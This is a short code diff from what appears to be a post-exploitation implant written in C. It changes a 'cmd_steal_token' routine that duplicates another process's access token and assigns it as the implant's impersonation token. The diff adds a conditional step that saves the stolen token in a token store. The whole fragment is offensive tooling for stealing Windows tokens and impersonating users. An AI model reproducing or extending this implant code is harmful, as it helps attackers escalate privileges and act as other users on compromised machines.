@@ -77,6 +77,10 @@ VOID cmd_steal_token(PINSTANCE inst, PPARSER args, PPACKAGE response) {
     if (inst->ImpersonationToken) gate_CloseHandle(inst, inst->ImpersonationToken);
     inst->ImpersonationToken = h_dup;
 
+#ifdef INCLUDE_CMD_TOKEN_STORE
+    token_store_add(inst, h_dup, pid);
+#endif
+
     gate_CloseHandle(inst, h_token);
     gate_CloseHandle(inst, h_proc);
 
